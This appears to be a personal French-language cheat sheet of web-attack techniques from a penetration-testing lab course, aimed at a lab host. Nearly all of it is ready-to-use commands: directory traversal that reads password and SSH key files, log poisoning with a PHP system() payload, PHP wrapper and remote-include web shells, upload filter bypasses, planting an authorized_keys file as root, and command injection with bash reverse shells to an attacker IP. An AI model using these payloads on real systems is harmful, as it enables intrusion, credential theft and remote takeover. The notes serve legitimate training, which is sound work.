
#### Directory Traversal

```bash

test pour voir si exploit possible

curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd

si cela fonctionne, récupérer clé privée pour rce avec ssh

curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa

ssh -i <keyfile> -p <port> user@ip

Si server ISS IMPORTANT lfi sur windows = / comme linux pas de \ car le \ est echappé en php aussi ne pas mettre C: dans la lfi juste aller à la racine qui est C: puis charger ce qu on veut comme si dessous:

?page../../../Windows/win.ini


double encodage

kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

```

#### LFI

```bash
lfi avec log poisoning
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log

192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"

Si dans loutput du log, le user agent est présent ou un autre header = possibilitée de log poisoning en modifiant le header comme si dessous:

User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>

après modificaztion du header
envoyer reqûte sur burp: http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls


reverse shell via lfi encoding

bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1" devient

bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22

puis ouvrir un listener sur la machine attaquante= nc -lnvp 4444

et envoyer requête sur burp: http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log?&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```

#### PHP Wrappers

```bash
php://filter = voir le contenu dun fichier 

curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php

encodage base64 pour bypass
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php

echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVE..." | base64 -d

data:// = execution de code

curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
admin.php
bavarian.php
css
fonts
img
index.php
js
...

Pour bypass les sécuritées mise en place
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==

curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls+-a"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
admin.php
bavarian.php
css
fonts
img
index.php
js
start.sh
...
```

#### RFI

```php
cat shell.php

<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/shell.php&cmd=ls"
```

On peut aussi heberger le reverse shell php de pentest monkey 


#### File Upload

```bash
Créer un fichier php avec extension pHP ou phps ou php7

Dans le fichier soit code php qui récupère les commandes soit reverse shell pentest monkey

(machine windows)
curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir

tips pour windows mettre entre guillemets avec %22 comme ça on peut \

curl http://192.168.54.189/meteor/uploads/sh.pHP?cmd=dir+%22..\..\..\..\..\%22

curl http://192.168.54.189/meteor/uploads/sh.pHP?cmd=type+%22C:\xampp\passwords.txt%22
```

#### File Upload + Directory traversal

Test d'upload simple

![[Pasted image 20251221154423.png]]

Changement du nom avec ../../../../../ on voit que le server prend le nom et le fait upload sur le server à l'endroit  ../../../../../test.txt

![[Pasted image 20251221154454.png]]

On peut donc essayer d'upload une clé privée pour avoir une rce avec ssh -i

```bash
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): maclé
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in fileup
Your public key has been saved in fileup.pub
...
cat maclé.pub > authorized_keys
```

On upload sa clé à la racine dans /root/.ssh/authorized_keys

![[Pasted image 20251221154620.png]]

```bash
ssh -p 2222 -i maclé root@mountaindesserts.com

si erreurs supprimer known_hosts
rm ~/.ssh/known_hosts 
```


#### Command Injection

```bash
POST avec burpsuite ou f12 pour voir la requete 
curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive
...
'git help -a' and 'git help -g' list available subcommands and some
concept guides. See 'git help <command>' or 'git help <concept>'
...

On peut bypass le filtre en utilisant %3B (;) entre les deux commandes 

curl -X POST --data 'Archive=git%3Bdir' http://192.168.50.189:8000/archive
...
examine the history and state (see also: git help revisions)
   bisect    Use binary search to find the commit that introduced a bug
   diff      Show changes between commits, commit and working tree, etc
   grep      Print lines matching a pattern
...

Directory: C:\Users\Administrator\Documents\meteor

Mode                 LastWriteTime         Length Name                      
----                 -------------         ------ ----
d-----          5/3/2022   6:21 AM                css                       
d-----          5/3/2022   6:21 AM                fonts                     
-a----         5/26/2022   9:33 AM           6126 index.html                
-a----          5/3/2022   6:21 AM        6426624 main.exe

Commande pour savoir si ce qui est éxecuter est cmd ou powershell:

(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell

Pour rce sur linux
curl -X POST --data 'Archive=git%3Bbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.54%2F4444%200%3E%261%22' http://192.168.54.16/archive

```
